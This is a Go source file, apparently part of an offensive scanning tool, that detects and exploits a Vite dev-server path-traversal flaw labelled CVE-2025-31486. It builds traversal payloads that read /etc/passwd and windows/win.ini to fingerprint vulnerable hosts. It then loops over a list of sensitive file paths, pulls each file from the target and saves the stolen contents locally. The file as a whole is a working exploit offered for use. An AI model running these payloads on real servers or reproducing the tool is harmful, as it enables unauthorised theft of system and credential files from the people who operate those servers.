package cmd

import (
	"bufio"
	"errors"
	"io"
	"os"
	"path"
	"regexp"
	"strings"
)

func (target *Target) check_CVE_2025_31486(sep string) (platform string, isVul bool) {

	INFO("[*] 检测目标：%s是否存在CVE_2025_31486\n", target.Url)
	resp, err := Request(target.Url)
	if err != nil {
		return "", false
	}
	defer resp.Body.Close()
	content, err := io.ReadAll(resp.Body)
	re := regexp.MustCompile(`<script type="module" src="(?:https?:\/\/[^\/]+)?(.*?)/@vite/client"`)
	matches := re.FindStringSubmatch(string(content))
	if len(matches) >= 2 {
		rootPath := matches[1]
		target.RootPath = rootPath
	}
	nixPayload := sep + "/x/x/x/vite-project/?/../../../../../etc/passwd?import&raw??"
	resp1, err := Request(target.Url + target.RootPath + nixPayload)
	if err == nil {
		defer resp1.Body.Close()
		content, err := io.ReadAll(resp1.Body)
		if err == nil {
			if strings.Contains(string(content), "export default") {
				target.Platform = "linux"
				return "linux", true
			}
		}
	}
	winPayload := sep + "/x/x/x/vite-project/?/../../../../../C://windows/win.ini?import&raw??"
	resp2, err := Request(target.Url + target.RootPath + winPayload)
	if err != nil {
		return "", false
	}
	defer resp2.Body.Close()
	content2, err := io.ReadAll(resp2.Body)
	if strings.Contains(string(content2), "export default") {
		target.Platform = "windows"
		return "windows", true
	}
	return "", false
}

// 根据相应的平台进行深度利用，比如读取敏感文件并保存到本地
func (target Target) exploit_CVE_2025_31486(sep string) (bool, error) {
	sensitivePathFile := path.Join(DictDir, target.Platform+"_sensitive_path.txt")
	file, err := os.Open(sensitivePathFile)
	if err != nil {
		return false, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		sensitivePath := scanner.Text()
		sensitivePath = strings.Replace(sensitivePath, "\\", "/", -1)
		testValUrl := target.Url + target.RootPath + sep + "/x/x/x/vite-project/?/../../../../../" + sensitivePath + "?import&raw??"
		response, err := Request(testValUrl)
		if err != nil {
			continue
		}
		defer response.Body.Close()
		resp, err := io.ReadAll(response.Body)
		content := string(resp)
		if !strings.Contains(content, "export default") {
			continue
		}
		fileName := path.Join(target.HOST, sensitivePath)
		fileName = path.Join(ResultDir, fileName)
		ok, err := writeContentToFile(content, fileName)
		if !ok {
			ERROR("[-] 解析%s网站内容时出现错误：%s 请手动检测该端点！\n", testValUrl, err.Error())
			continue
		}
		SUCCESS("[+] 对%s的漏洞利用成功！敏感文件已经写入到%s中\n", testValUrl, fileName)
	}
	info, err := os.Stat(path.Join(ResultDir, target.HOST))
	if err != nil {
		if os.IsNotExist(err) {
			return false, errors.New("利用失败!")
		}
		return false, err
	}
	return info.IsDir(), nil
}
